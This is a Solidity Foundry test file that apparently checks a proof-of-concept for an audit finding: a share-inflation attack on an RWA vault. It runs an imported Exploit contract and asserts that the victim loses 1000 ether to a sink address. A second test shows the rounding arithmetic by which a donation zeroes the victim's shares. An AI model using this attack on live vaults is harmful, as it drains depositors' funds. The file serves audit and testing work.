// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Exploit, ERC20, RWAVault} from "./66359-h-18-inflation-attack-in-rwa-vault-pashov-audit-group-none-r.sol";

contract Finding66359Test is Test {
    function test_victim_receives_zero_shares_and_loses_1000_ether() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.vault().shares(address(e.victim())), 0, "shares");
        assertEq(e.token().balanceOf(address(e.victim())), 0, "victim balance");
        assertEq(e.token().balanceOf(address(e.sink())), 1000 ether, "extracted");
        assertEq(e.vault().supply(), 0, "supply burned");
    }

    function test_control_donation_is_what_zeros_the_share() public {
        // Same formula, no donation: 1000 ether deposited against 1 wei of assets mints shares.
        uint256 shares = (uint256(1000 ether) * 1) / (1 + 1000 ether);
        uint256 fair = (uint256(1000 ether) * 1) / 1;
        assertEq(shares, 0, "donated price");
        assertEq(fair, 1000 ether, "undonated price");
    }
}
